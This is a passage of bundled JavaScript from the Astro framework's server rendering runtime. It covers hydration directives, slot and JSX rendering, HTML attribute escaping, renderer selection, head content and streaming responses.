      if (!extracted.hydration) {
        extracted.hydration = {
          directive: "",
          value: "",
          componentUrl: "",
          componentExport: { value: "" }
        };
      }
      switch (key) {
        case "client:component-path": {
          extracted.hydration.componentUrl = value;
          break;
        }
        case "client:component-export": {
          extracted.hydration.componentExport.value = value;
          break;
        }
        case "client:component-hydration": {
          break;
        }
        case "client:display-name": {
          break;
        }
        default: {
          extracted.hydration.directive = key.split(":")[1];
          extracted.hydration.value = value;
          if (!HydrationDirectives.has(extracted.hydration.directive)) {
            throw new Error(
              `Error: invalid hydration directive "${key}". Supported hydration methods: ${Array.from(
                HydrationDirectiveProps
              ).join(", ")}`
            );
          }
          if (extracted.hydration.directive === "media" && typeof extracted.hydration.value !== "string") {
            throw new AstroError(AstroErrorData.MissingMediaQueryDirective);
          }
          break;
        }
      }
    } else if (key === "class:list") {
      if (value) {
        extracted.props[key.slice(0, -5)] = serializeListValue(value);
      }
    } else {
      extracted.props[key] = value;
    }
  }
  for (const sym of Object.getOwnPropertySymbols(inputProps)) {
    extracted.props[sym] = inputProps[sym];
  }
  return extracted;
}
async function generateHydrateScript(scriptOptions, metadata) {
  const { renderer, result, astroId, props, attrs } = scriptOptions;
  const { hydrate, componentUrl, componentExport } = metadata;
  if (!componentExport.value) {
    throw new Error(
      `Unable to resolve a valid export for "${metadata.displayName}"! Please open an issue at https://astro.build/issues!`
    );
  }
  const island = {
    children: "",
    props: {
      uid: astroId
    }
  };
  if (attrs) {
    for (const [key, value] of Object.entries(attrs)) {
      island.props[key] = escapeHTML(value);
    }
  }
  island.props["component-url"] = await result.resolve(decodeURI(componentUrl));
  if (renderer.clientEntrypoint) {
    island.props["component-export"] = componentExport.value;
    island.props["renderer-url"] = await result.resolve(decodeURI(renderer.clientEntrypoint));
    island.props["props"] = escapeHTML(serializeProps(props, metadata));
  }
  island.props["ssr"] = "";
  island.props["client"] = hydrate;
  let beforeHydrationUrl = await result.resolve("astro:scripts/before-hydration.js");
  if (beforeHydrationUrl.length) {
    island.props["before-hydration-url"] = beforeHydrationUrl;
  }
  island.props["opts"] = escapeHTML(
    JSON.stringify({
      name: metadata.displayName,
      value: metadata.hydrateArgs || ""
    })
  );
  return island;
}

var _a$2;
const astroComponentInstanceSym = Symbol.for("astro.componentInstance");
class AstroComponentInstance {
  constructor(result, props, slots, factory) {
    this[_a$2] = true;
    this.result = result;
    this.props = props;
    this.factory = factory;
    this.slotValues = {};
    for (const name in slots) {
      this.slotValues[name] = slots[name]();
    }
  }
  async init() {
    this.returnValue = this.factory(this.result, this.props, this.slotValues);
    return this.returnValue;
  }
  async *render() {
    if (this.returnValue === void 0) {
      await this.init();
    }
    let value = this.returnValue;
    if (isPromise(value)) {
      value = await value;
    }
    if (isHeadAndContent(value)) {
      yield* value.content;
    } else {
      yield* renderChild(value);
    }
  }
}
_a$2 = astroComponentInstanceSym;
function validateComponentProps(props, displayName) {
  if (props != null) {
    for (const prop of Object.keys(props)) {
      if (HydrationDirectiveProps.has(prop)) {
        console.warn(
          `You are attempting to render <${displayName} ${prop} />, but ${displayName} is an Astro component. Astro components do not render in the client and should not have a hydration directive. Please use a framework component for client rendering.`
        );
      }
    }
  }
}
function createAstroComponentInstance(result, displayName, factory, props, slots = {}) {
  validateComponentProps(props, displayName);
  const instance = new AstroComponentInstance(result, props, slots, factory);
  if (isAPropagatingComponent(result, factory) && !result.propagators.has(factory)) {
    result.propagators.set(factory, instance);
  }
  return instance;
}
function isAstroComponentInstance(obj) {
  return typeof obj === "object" && !!obj[astroComponentInstanceSym];
}

async function* renderChild(child) {
  child = await child;
  if (child instanceof SlotString) {
    if (child.instructions) {
      yield* child.instructions;
    }
    yield child;
  } else if (isHTMLString(child)) {
    yield child;
  } else if (Array.isArray(child)) {
    for (const value of child) {
      yield markHTMLString(await renderChild(value));
    }
  } else if (typeof child === "function") {
    yield* renderChild(child());
  } else if (typeof child === "string") {
    yield markHTMLString(escapeHTML(child));
  } else if (!child && child !== 0) ; else if (isRenderTemplateResult(child)) {
    yield* renderAstroTemplateResult(child);
  } else if (isAstroComponentInstance(child)) {
    yield* child.render();
  } else if (ArrayBuffer.isView(child)) {
    yield child;
  } else if (typeof child === "object" && (Symbol.asyncIterator in child || Symbol.iterator in child)) {
    yield* child;
  } else {
    yield child;
  }
}

const slotString = Symbol.for("astro:slot-string");
class SlotString extends HTMLString {
  constructor(content, instructions) {
    super(content);
    this.instructions = instructions;
    this[slotString] = true;
  }
}
function isSlotString(str) {
  return !!str[slotString];
}
async function renderSlot(_result, slotted, fallback) {
  if (slotted) {
    let iterator = renderChild(slotted);
    let content = "";
    let instructions = null;
    for await (const chunk of iterator) {
      if (chunk.type === "directive") {
        if (instructions === null) {
          instructions = [];
        }
        instructions.push(chunk);
      } else {
        content += chunk;
      }
    }
    return markHTMLString(new SlotString(content, instructions));
  }
  return fallback;
}
async function renderSlots(result, slots = {}) {
  let slotInstructions = null;
  let children = {};
  if (slots) {
    await Promise.all(
      Object.entries(slots).map(
        ([key, value]) => renderSlot(result, value).then((output) => {
          if (output.instructions) {
            if (slotInstructions === null) {
              slotInstructions = [];
            }
            slotInstructions.push(...output.instructions);
          }
          children[key] = output;
        })
      )
    );
  }
  return { slotInstructions, children };
}

const Fragment = Symbol.for("astro:fragment");
const Renderer = Symbol.for("astro:renderer");
const encoder = new TextEncoder();
const decoder = new TextDecoder();
function stringifyChunk(result, chunk) {
  switch (chunk.type) {
    case "directive": {
      const { hydration } = chunk;
      let needsHydrationScript = hydration && determineIfNeedsHydrationScript(result);
      let needsDirectiveScript = hydration && determinesIfNeedsDirectiveScript(result, hydration.directive);
      let prescriptType = needsHydrationScript ? "both" : needsDirectiveScript ? "directive" : null;
      if (prescriptType) {
        let prescripts = getPrescripts(prescriptType, hydration.directive);
        return markHTMLString(prescripts);
      } else {
        return "";
      }
    }
    default: {
      if (isSlotString(chunk)) {
        let out = "";
        const c = chunk;
        if (c.instructions) {
          for (const instr of c.instructions) {
            out += stringifyChunk(result, instr);
          }
        }
        out += chunk.toString();
        return out;
      }
      return chunk.toString();
    }
  }
}
class HTMLParts {
  constructor() {
    this.parts = "";
  }
  append(part, result) {
    if (ArrayBuffer.isView(part)) {
      this.parts += decoder.decode(part);
    } else {
      this.parts += stringifyChunk(result, part);
    }
  }
  toString() {
    return this.parts;
  }
  toArrayBuffer() {
    return encoder.encode(this.parts);
  }
}
function chunkToByteArray(result, chunk) {
  if (chunk instanceof Uint8Array) {
    return chunk;
  }
  return encoder.encode(stringifyChunk(result, chunk));
}

const ClientOnlyPlaceholder = "astro-client-only";
class Skip {
  constructor(vnode) {
    this.vnode = vnode;
    this.count = 0;
  }
  increment() {
    this.count++;
  }
  haveNoTried() {
    return this.count === 0;
  }
  isCompleted() {
    return this.count > 2;
  }
}
Skip.symbol = Symbol("astro:jsx:skip");
let originalConsoleError;
let consoleFilterRefs = 0;
async function renderJSX(result, vnode) {
  switch (true) {
    case vnode instanceof HTMLString:
      if (vnode.toString().trim() === "") {
        return "";
      }
      return vnode;
    case typeof vnode === "string":
      return markHTMLString(escapeHTML(vnode));
    case typeof vnode === "function":
      return vnode;
    case (!vnode && vnode !== 0):
      return "";
    case Array.isArray(vnode):
      return markHTMLString(
        (await Promise.all(vnode.map((v) => renderJSX(result, v)))).join("")
      );
  }
  let skip;
  if (vnode.props) {
    if (vnode.props[Skip.symbol]) {
      skip = vnode.props[Skip.symbol];
    } else {
      skip = new Skip(vnode);
    }
  } else {
    skip = new Skip(vnode);
  }
  return renderJSXVNode(result, vnode, skip);
}
async function renderJSXVNode(result, vnode, skip) {
  if (isVNode(vnode)) {
    switch (true) {
      case !vnode.type: {
        throw new Error(`Unable to render ${result._metadata.pathname} because it contains an undefined Component!
Did you forget to import the component or is it possible there is a typo?`);
      }
      case vnode.type === Symbol.for("astro:fragment"):
        return renderJSX(result, vnode.props.children);
      case vnode.type.isAstroComponentFactory: {
        let props = {};
        let slots = {};
        for (const [key, value] of Object.entries(vnode.props ?? {})) {
          if (key === "children" || value && typeof value === "object" && value["$$slot"]) {
            slots[key === "children" ? "default" : key] = () => renderJSX(result, value);
          } else {
            props[key] = value;
          }
        }
        return markHTMLString(await renderToString(result, vnode.type, props, slots));
      }
      case (!vnode.type && vnode.type !== 0):
        return "";
      case (typeof vnode.type === "string" && vnode.type !== ClientOnlyPlaceholder):
        return markHTMLString(await renderElement$1(result, vnode.type, vnode.props ?? {}));
    }
    if (vnode.type) {
      let extractSlots2 = function(child) {
        if (Array.isArray(child)) {
          return child.map((c) => extractSlots2(c));
        }
        if (!isVNode(child)) {
          _slots.default.push(child);
          return;
        }
        if ("slot" in child.props) {
          _slots[child.props.slot] = [..._slots[child.props.slot] ?? [], child];
          delete child.props.slot;
          return;
        }
        _slots.default.push(child);
      };
      if (typeof vnode.type === "function" && vnode.type["astro:renderer"]) {
        skip.increment();
      }
      if (typeof vnode.type === "function" && vnode.props["server:root"]) {
        const output2 = await vnode.type(vnode.props ?? {});
        return await renderJSX(result, output2);
      }
      if (typeof vnode.type === "function") {
        if (skip.haveNoTried() || skip.isCompleted()) {
          useConsoleFilter();
          try {
            const output2 = await vnode.type(vnode.props ?? {});
            let renderResult;
            if (output2 && output2[AstroJSX]) {
              renderResult = await renderJSXVNode(result, output2, skip);
              return renderResult;
            } else if (!output2) {
              renderResult = await renderJSXVNode(result, output2, skip);
              return renderResult;
            }
          } catch (e) {
            if (skip.isCompleted()) {
              throw e;
            }
            skip.increment();
          } finally {
            finishUsingConsoleFilter();
          }
        } else {
          skip.increment();
        }
      }
      const { children = null, ...props } = vnode.props ?? {};
      const _slots = {
        default: []
      };
      extractSlots2(children);
      for (const [key, value] of Object.entries(props)) {
        if (value["$$slot"]) {
          _slots[key] = value;
          delete props[key];
        }
      }
      const slotPromises = [];
      const slots = {};
      for (const [key, value] of Object.entries(_slots)) {
        slotPromises.push(
          renderJSX(result, value).then((output2) => {
            if (output2.toString().trim().length === 0)
              return;
            slots[key] = () => output2;
          })
        );
      }
      await Promise.all(slotPromises);
      props[Skip.symbol] = skip;
      let output;
      if (vnode.type === ClientOnlyPlaceholder && vnode.props["client:only"]) {
        output = await renderComponentToIterable(
          result,
          vnode.props["client:display-name"] ?? "",
          null,
          props,
          slots
        );
      } else {
        output = await renderComponentToIterable(
          result,
          typeof vnode.type === "function" ? vnode.type.name : vnode.type,
          vnode.type,
          props,
          slots
        );
      }
      if (typeof output !== "string" && Symbol.asyncIterator in output) {
        let parts = new HTMLParts();
        for await (const chunk of output) {
          parts.append(chunk, result);
        }
        return markHTMLString(parts.toString());
      } else {
        return markHTMLString(output);
      }
    }
  }
  return markHTMLString(`${vnode}`);
}
async function renderElement$1(result, tag, { children, ...props }) {
  return markHTMLString(
    `<${tag}${spreadAttributes(props)}${markHTMLString(
      (children == null || children == "") && voidElementNames.test(tag) ? `/>` : `>${children == null ? "" : await renderJSX(result, children)}</${tag}>`
    )}`
  );
}
function useConsoleFilter() {
  consoleFilterRefs++;
  if (!originalConsoleError) {
    originalConsoleError = console.error;
    try {
      console.error = filteredConsoleError;
    } catch (error) {
    }
  }
}
function finishUsingConsoleFilter() {
  consoleFilterRefs--;
}
function filteredConsoleError(msg, ...rest) {
  if (consoleFilterRefs > 0 && typeof msg === "string") {
    const isKnownReactHookError = msg.includes("Warning: Invalid hook call.") && msg.includes("https://reactjs.org/link/invalid-hook-call");
    if (isKnownReactHookError)
      return;
  }
  originalConsoleError(msg, ...rest);
}

/**
 * shortdash - https://github.com/bibig/node-shorthash
 *
 * @license
 *
 * (The MIT License)
 *
 * Copyright (c) 2013 Bibig <bibig@me.com>
 *
 * Permission is hereby granted, free of charge, to any person
 * obtaining a copy of this software and associated documentation
 * files (the "Software"), to deal in the Software without
 * restriction, including without limitation the rights to use,
 * copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following
 * conditions:
 *
 * The above copyright notice and this permission notice shall be
 * included in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
 * OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
 * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
 * WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 * OTHER DEALINGS IN THE SOFTWARE.
 */
const dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY";
const binary = dictionary.length;
function bitwise(str) {
  let hash = 0;
  if (str.length === 0)
    return hash;
  for (let i = 0; i < str.length; i++) {
    const ch = str.charCodeAt(i);
    hash = (hash << 5) - hash + ch;
    hash = hash & hash;
  }
  return hash;
}
function shorthash(text) {
  let num;
  let result = "";
  let integer = bitwise(text);
  const sign = integer < 0 ? "Z" : "";
  integer = Math.abs(integer);
  while (integer >= binary) {
    num = integer % binary;
    integer = Math.floor(integer / binary);
    result = dictionary[num] + result;
  }
  if (integer > 0) {
    result = dictionary[integer] + result;
  }
  return sign + result;
}

const voidElementNames = /^(area|base|br|col|command|embed|hr|img|input|keygen|link|meta|param|source|track|wbr)$/i;
const htmlBooleanAttributes = /^(allowfullscreen|async|autofocus|autoplay|controls|default|defer|disabled|disablepictureinpicture|disableremoteplayback|formnovalidate|hidden|loop|nomodule|novalidate|open|playsinline|readonly|required|reversed|scoped|seamless|itemscope)$/i;
const htmlEnumAttributes = /^(contenteditable|draggable|spellcheck|value)$/i;
const svgEnumAttributes = /^(autoReverse|externalResourcesRequired|focusable|preserveAlpha)$/i;
const STATIC_DIRECTIVES = /* @__PURE__ */ new Set(["set:html", "set:text"]);
const toIdent = (k) => k.trim().replace(/(?:(?!^)\b\w|\s+|[^\w]+)/g, (match, index) => {
  if (/[^\w]|\s/.test(match))
    return "";
  return index === 0 ? match : match.toUpperCase();
});
const toAttributeString = (value, shouldEscape = true) => shouldEscape ? String(value).replace(/&/g, "&#38;").replace(/"/g, "&#34;") : value;
const kebab = (k) => k.toLowerCase() === k ? k : k.replace(/[A-Z]/g, (match) => `-${match.toLowerCase()}`);
const toStyleString = (obj) => Object.entries(obj).map(([k, v]) => `${kebab(k)}:${v}`).join(";");
function defineScriptVars(vars) {
  let output = "";
  for (const [key, value] of Object.entries(vars)) {
    output += `const ${toIdent(key)} = ${JSON.stringify(value)};
`;
  }
  return markHTMLString(output);
}
function formatList(values) {
  if (values.length === 1) {
    return values[0];
  }
  return `${values.slice(0, -1).join(", ")} or ${values[values.length - 1]}`;
}
function addAttribute(value, key, shouldEscape = true) {
  if (value == null) {
    return "";
  }
  if (value === false) {
    if (htmlEnumAttributes.test(key) || svgEnumAttributes.test(key)) {
      return markHTMLString(` ${key}="false"`);
    }
    return "";
  }
  if (STATIC_DIRECTIVES.has(key)) {
    console.warn(`[astro] The "${key}" directive cannot be applied dynamically at runtime. It will not be rendered as an attribute.

Make sure to use the static attribute syntax (\`${key}={value}\`) instead of the dynamic spread syntax (\`{...{ "${key}": value }}\`).`);
    return "";
  }
  if (key === "class:list") {
    const listValue = toAttributeString(serializeListValue(value), shouldEscape);
    if (listValue === "") {
      return "";
    }
    return markHTMLString(` ${key.slice(0, -5)}="${listValue}"`);
  }
  if (key === "style" && !(value instanceof HTMLString) && typeof value === "object") {
    return markHTMLString(` ${key}="${toAttributeString(toStyleString(value), shouldEscape)}"`);
  }
  if (key === "className") {
    return markHTMLString(` class="${toAttributeString(value, shouldEscape)}"`);
  }
  if (value === true && (key.startsWith("data-") || htmlBooleanAttributes.test(key))) {
    return markHTMLString(` ${key}`);
  } else {
    return markHTMLString(` ${key}="${toAttributeString(value, shouldEscape)}"`);
  }
}
function internalSpreadAttributes(values, shouldEscape = true) {
  let output = "";
  for (const [key, value] of Object.entries(values)) {
    output += addAttribute(value, key, shouldEscape);
  }
  return markHTMLString(output);
}
function renderElement(name, { props: _props, children = "" }, shouldEscape = true) {
  const { lang: _, "data-astro-id": astroId, "define:vars": defineVars, ...props } = _props;
  if (defineVars) {
    if (name === "style") {
      delete props["is:global"];
      delete props["is:scoped"];
    }
    if (name === "script") {
      delete props.hoist;
      children = defineScriptVars(defineVars) + "\n" + children;
    }
  }
  if ((children == null || children == "") && voidElementNames.test(name)) {
    return `<${name}${internalSpreadAttributes(props, shouldEscape)} />`;
  }
  return `<${name}${internalSpreadAttributes(props, shouldEscape)}>${children}</${name}>`;
}

function componentIsHTMLElement(Component) {
  return typeof HTMLElement !== "undefined" && HTMLElement.isPrototypeOf(Component);
}
async function renderHTMLElement(result, constructor, props, slots) {
  const name = getHTMLElementName(constructor);
  let attrHTML = "";
  for (const attr in props) {
    attrHTML += ` ${attr}="${toAttributeString(await props[attr])}"`;
  }
  return markHTMLString(
    `<${name}${attrHTML}>${await renderSlot(result, slots == null ? void 0 : slots.default)}</${name}>`
  );
}
function getHTMLElementName(constructor) {
  const definedName = customElements.getName(constructor);
  if (definedName)
    return definedName;
  const assignedName = constructor.name.replace(/^HTML|Element$/g, "").replace(/[A-Z]/g, "-$&").toLowerCase().replace(/^-/, "html-");
  return assignedName;
}

const rendererAliases = /* @__PURE__ */ new Map([["solid", "solid-js"]]);
function guessRenderers(componentUrl) {
  const extname = componentUrl == null ? void 0 : componentUrl.split(".").pop();
  switch (extname) {
    case "svelte":
      return ["@astrojs/svelte"];
    case "vue":
      return ["@astrojs/vue"];
    case "jsx":
    case "tsx":
      return ["@astrojs/react", "@astrojs/preact", "@astrojs/solid", "@astrojs/vue (jsx)"];
    default:
      return [
        "@astrojs/react",
        "@astrojs/preact",
        "@astrojs/solid",
        "@astrojs/vue",
        "@astrojs/svelte"
      ];
  }
}
function isFragmentComponent(Component) {
  return Component === Fragment;
}
function isHTMLComponent(Component) {
  return Component && typeof Component === "object" && Component["astro:html"];
}
async function renderFrameworkComponent(result, displayName, Component, _props, slots = {}) {
  var _a, _b;
  if (!Component && !_props["client:only"]) {
    throw new Error(
      `Unable to render ${displayName} because it is ${Component}!
Did you forget to import the component or is it possible there is a typo?`
    );
  }
  const { renderers } = result._metadata;
  const metadata = { displayName };
  const { hydration, isPage, props } = extractDirectives(displayName, _props);
  let html = "";
  let attrs = void 0;
  if (hydration) {
    metadata.hydrate = hydration.directive;
    metadata.hydrateArgs = hydration.value;
    metadata.componentExport = hydration.componentExport;
    metadata.componentUrl = hydration.componentUrl;
  }
  const probableRendererNames = guessRenderers(metadata.componentUrl);
  const validRenderers = renderers.filter((r) => r.name !== "astro:jsx");
  const { children, slotInstructions } = await renderSlots(result, slots);
  let renderer;
  if (metadata.hydrate !== "only") {
    let isTagged = false;
    try {
      isTagged = Component && Component[Renderer];
    } catch {
    }
    if (isTagged) {
      const rendererName = Component[Renderer];
      renderer = renderers.find(({ name }) => name === rendererName);
    }
    if (!renderer) {
      let error;
      for (const r of renderers) {
        try {
          if (await r.ssr.check.call({ result }, Component, props, children)) {
            renderer = r;
            break;
          }
        } catch (e) {
          error ?? (error = e);
        }
      }
      if (!renderer && error) {
        throw error;
      }
    }
    if (!renderer && typeof HTMLElement === "function" && componentIsHTMLElement(Component)) {
      const output = renderHTMLElement(result, Component, _props, slots);
      return output;
    }
  } else {
    if (metadata.hydrateArgs) {
      const passedName = metadata.hydrateArgs;
      const rendererName = rendererAliases.has(passedName) ? rendererAliases.get(passedName) : passedName;
      renderer = renderers.find(
        ({ name }) => name === `@astrojs/${rendererName}` || name === rendererName
      );
    }
    if (!renderer && validRenderers.length === 1) {
      renderer = validRenderers[0];
    }
    if (!renderer) {
      const extname = (_a = metadata.componentUrl) == null ? void 0 : _a.split(".").pop();
      renderer = renderers.filter(
        ({ name }) => name === `@astrojs/${extname}` || name === extname
      )[0];
    }
  }
  if (!renderer) {
    if (metadata.hydrate === "only") {
      throw new AstroError({
        ...AstroErrorData.NoClientOnlyHint,
        message: AstroErrorData.NoClientOnlyHint.message(metadata.displayName),
        hint: AstroErrorData.NoClientOnlyHint.hint(
          probableRendererNames.map((r) => r.replace("@astrojs/", "")).join("|")
        )
      });
    } else if (typeof Component !== "string") {
      const matchingRenderers = validRenderers.filter(
        (r) => probableRendererNames.includes(r.name)
      );
      const plural = validRenderers.length > 1;
      if (matchingRenderers.length === 0) {
        throw new AstroError({
          ...AstroErrorData.NoMatchingRenderer,
          message: AstroErrorData.NoMatchingRenderer.message(
            metadata.displayName,
            (_b = metadata == null ? void 0 : metadata.componentUrl) == null ? void 0 : _b.split(".").pop(),
            plural,
            validRenderers.length
          ),
          hint: AstroErrorData.NoMatchingRenderer.hint(
            formatList(probableRendererNames.map((r) => "`" + r + "`"))
          )
        });
      } else if (matchingRenderers.length === 1) {
        renderer = matchingRenderers[0];
        ({ html, attrs } = await renderer.ssr.renderToStaticMarkup.call(
          { result },
          Component,
          props,
          children,
          metadata
        ));
      } else {
        throw new Error(`Unable to render ${metadata.displayName}!

This component likely uses ${formatList(probableRendererNames)},
but Astro encountered an error during server-side rendering.

Please ensure that ${metadata.displayName}:
1. Does not unconditionally access browser-specific globals like \`window\` or \`document\`.
   If this is unavoidable, use the \`client:only\` hydration directive.
2. Does not conditionally return \`null\` or \`undefined\` when rendered on the server.

If you're still stuck, please open an issue on GitHub or join us at https://astro.build/chat.`);
      }
    }
  } else {
    if (metadata.hydrate === "only") {
      html = await renderSlot(result, slots == null ? void 0 : slots.fallback);
    } else {
      ({ html, attrs } = await renderer.ssr.renderToStaticMarkup.call(
        { result },
        Component,
        props,
        children,
        metadata
      ));
    }
  }
  if (renderer && !renderer.clientEntrypoint && renderer.name !== "@astrojs/lit" && metadata.hydrate) {
    throw new AstroError({
      ...AstroErrorData.NoClientEntrypoint,
      message: AstroErrorData.NoClientEntrypoint.message(
        displayName,
        metadata.hydrate,
        renderer.name
      )
    });
  }
  if (!html && typeof Component === "string") {
    const Tag = sanitizeElementName(Component);
    const childSlots = Object.values(children).join("");
    const iterable = renderAstroTemplateResult(
      await renderTemplate`<${Tag}${internalSpreadAttributes(props)}${markHTMLString(
        childSlots === "" && voidElementNames.test(Tag) ? `/>` : `>${childSlots}</${Tag}>`
      )}`
    );
    html = "";
    for await (const chunk of iterable) {
      html += chunk;
    }
  }
  if (!hydration) {
    return async function* () {
      if (slotInstructions) {
        yield* slotInstructions;
      }
      if (isPage || (renderer == null ? void 0 : renderer.name) === "astro:jsx") {
        yield html;
      } else {
        yield markHTMLString(html.replace(/\<\/?astro-slot\>/g, ""));
      }
    }();
  }
  const astroId = shorthash(
    `<!--${metadata.componentExport.value}:${metadata.componentUrl}-->
${html}
${serializeProps(
      props,
      metadata
    )}`
  );
  const island = await generateHydrateScript(
    { renderer, result, astroId, props, attrs },
    metadata
  );
  let unrenderedSlots = [];
  if (html) {
    if (Object.keys(children).length > 0) {
      for (const key of Object.keys(children)) {
        if (!html.includes(key === "default" ? `<astro-slot>` : `<astro-slot name="${key}">`)) {
          unrenderedSlots.push(key);
        }
      }
    }
  } else {
    unrenderedSlots = Object.keys(children);
  }
  const template = unrenderedSlots.length > 0 ? unrenderedSlots.map(
    (key) => `<template data-astro-template${key !== "default" ? `="${key}"` : ""}>${children[key]}</template>`
  ).join("") : "";
  island.children = `${html ?? ""}${template}`;
  if (island.children) {
    island.props["await-children"] = "";
  }
  async function* renderAll() {
    if (slotInstructions) {
      yield* slotInstructions;
    }
    yield { type: "directive", hydration, result };
    yield markHTMLString(renderElement("astro-island", island, false));
  }
  return renderAll();
}
function sanitizeElementName(tag) {
  const unsafe = /[&<>'"\s]+/g;
  if (!unsafe.test(tag))
    return tag;
  return tag.trim().split(unsafe)[0].trim();
}
async function renderFragmentComponent(result, slots = {}) {
  const children = await renderSlot(result, slots == null ? void 0 : slots.default);
  if (children == null) {
    return children;
  }
  return markHTMLString(children);
}
async function renderHTMLComponent(result, Component, _props, slots = {}) {
  const { slotInstructions, children } = await renderSlots(result, slots);
  const html = Component.render({ slots: children });
  const hydrationHtml = slotInstructions ? slotInstructions.map((instr) => stringifyChunk(result, instr)).join("") : "";
  return markHTMLString(hydrationHtml + html);
}
function renderComponent(result, displayName, Component, props, slots = {}) {
  if (isPromise(Component)) {
    return Promise.resolve(Component).then((Unwrapped) => {
      return renderComponent(result, displayName, Unwrapped, props, slots);
    });
  }
  if (isFragmentComponent(Component)) {
    return renderFragmentComponent(result, slots);
  }
  if (isHTMLComponent(Component)) {
    return renderHTMLComponent(result, Component, props, slots);
  }
  if (isAstroComponentFactory(Component)) {
    return createAstroComponentInstance(result, displayName, Component, props, slots);
  }
  return renderFrameworkComponent(result, displayName, Component, props, slots);
}
function renderComponentToIterable(result, displayName, Component, props, slots = {}) {
  const renderResult = renderComponent(result, displayName, Component, props, slots);
  if (isAstroComponentInstance(renderResult)) {
    return renderResult.render();
  }
  return renderResult;
}

const uniqueElements = (item, index, all) => {
  const props = JSON.stringify(item.props);
  const children = item.children;
  return index === all.findIndex((i) => JSON.stringify(i.props) === props && i.children == children);
};
async function* renderExtraHead(result, base) {
  yield base;
  for (const part of result.extraHead) {
    yield* renderChild(part);
  }
}
function renderAllHeadContent(result) {
  const styles = Array.from(result.styles).filter(uniqueElements).map((style) => renderElement("style", style));
  result.styles.clear();
  const scripts = Array.from(result.scripts).filter(uniqueElements).map((script, i) => {
    return renderElement("script", script, false);
  });
  const links = Array.from(result.links).filter(uniqueElements).map((link) => renderElement("link", link, false));
  const baseHeadContent = markHTMLString(links.join("\n") + styles.join("\n") + scripts.join("\n"));
  if (result.extraHead.length > 0) {
    return renderExtraHead(result, baseHeadContent);
  } else {
    return baseHeadContent;
  }
}
function createRenderHead(result) {
  result._metadata.hasRenderedHead = true;
  return renderAllHeadContent.bind(null, result);
}
const renderHead = createRenderHead;
async function* maybeRenderHead(result) {
  if (result._metadata.hasRenderedHead) {
    return;
  }
  yield createRenderHead(result)();
}

var __accessCheck$2 = (obj, member, msg) => {
  if (!member.has(obj))
    throw TypeError("Cannot " + msg);
};
var __privateGet$2 = (obj, member, getter) => {
  __accessCheck$2(obj, member, "read from private field");
  return getter ? getter.call(obj) : member.get(obj);
};
var __privateAdd$2 = (obj, member, value) => {
  if (member.has(obj))
    throw TypeError("Cannot add the same private member more than once");
  member instanceof WeakSet ? member.add(obj) : member.set(obj, value);
};
var __privateSet$2 = (obj, member, value, setter) => {
  __accessCheck$2(obj, member, "write to private field");
  setter ? setter.call(obj, value) : member.set(obj, value);
  return value;
};
const isNodeJS = typeof process === "object" && Object.prototype.toString.call(process) === "[object process]";
let StreamingCompatibleResponse;
function createResponseClass() {
  var _isStream, _body, _a;
  StreamingCompatibleResponse = (_a = class extends Response {
    constructor(body, init) {
      let isStream = body instanceof ReadableStream;
      super(isStream ? null : body, init);
      __privateAdd$2(this, _isStream, void 0);
      __privateAdd$2(this, _body, void 0);
      __privateSet$2(this, _isStream, isStream);
      __privateSet$2(this, _body, body);
    }
    get body() {
      return __privateGet$2(this, _body);
    }
    async text() {
      if (__privateGet$2(this, _isStream) && isNodeJS) {
        let decoder = new TextDecoder();
        let body = __privateGet$2(this, _body);
        let out = "";
        for await (let chunk of body) {
          out += decoder.decode(chunk);
        }
        return out;
      }
      return super.text();
    }
    async arrayBuffer() {
      if (__privateGet$2(this, _isStream) && isNodeJS) {
        let body = __privateGet$2(this, _body);
        let chunks = [];
        let len = 0;
        for await (let chunk of body) {
          chunks.push(chunk);
          len += chunk.length;
        }
        let ab = new Uint8Array(len);
        let offset = 0;
        for (const chunk of chunks) {
          ab.set(chunk, offset);
          offset += chunk.length;
        }
        return ab;
      }
      return super.arrayBuffer();
    }
  }, _isStream = new WeakMap(), _body = new WeakMap(), _a);
  return StreamingCompatibleResponse;
}
const createResponse = isNodeJS ? (body, init) => {
  if (typeof body === "string" || ArrayBuffer.isView(body)) {
    return new Response(body, init);
  }
  if (typeof StreamingCompatibleResponse === "undefined") {
    return new (createResponseClass())(body, init);
  }
  return new StreamingCompatibleResponse(body, init);
} : (body, init) => new Response(body, init);

const needsHeadRenderingSymbol = Symbol.for("astro.needsHeadRendering");
function nonAstroPageNeedsHeadInjection(pageComponent) {
  return needsHeadRenderingSymbol in pageComponent && !!pageComponent[needsHeadRenderingSymbol];
}
async function iterableToHTMLBytes(result, iterable, onDocTypeInjection) {
  const parts = new HTMLParts();
  let i = 0;
  for await (const chunk of iterable) {
    if (isHTMLString(chunk)) {
      if (i === 0) {
        i++;
        if (!/<!doctype html/i.test(String(chunk))) {
          parts.append("<!DOCTYPE html>\n", result);
          if (onDocTypeInjection) {
            await onDocTypeInjection(parts);
          }
        }
      }
    }
    parts.append(chunk, result);
  }
  return parts.toArrayBuffer();
}
async function bufferHeadContent(result) {
  const iterator = result.propagators.values();
  while (true) {
    const { value, done } = iterator.next();
    if (done) {
      break;
    }
    const returnValue = await value.init();
    if (isHeadAndContent(returnValue)) {
      result.extraHead.push(returnValue.head);
    }
  }
}
async function renderPage$1(result, componentFactory, props, children, streaming, route) {
  if (!isAstroComponentFactory(componentFactory)) {
    const pageProps = { ...props ?? {}, "server:root": true };
    let output;
    try {
      const renderResult = await renderComponent(
        result,
        componentFactory.name,
        componentFactory,
        pageProps,
        null
      );
      if (isAstroComponentInstance(renderResult)) {
        output = renderResult.render();
      } else {
        output = renderResult;
      }
    } catch (e) {
      if (AstroError.is(e) && !e.loc) {
        e.setLocation({
          file: route == null ? void 0 : route.component
        });
      }
      throw e;
    }
    const bytes = await iterableToHTMLBytes(result, output, async (parts) => {
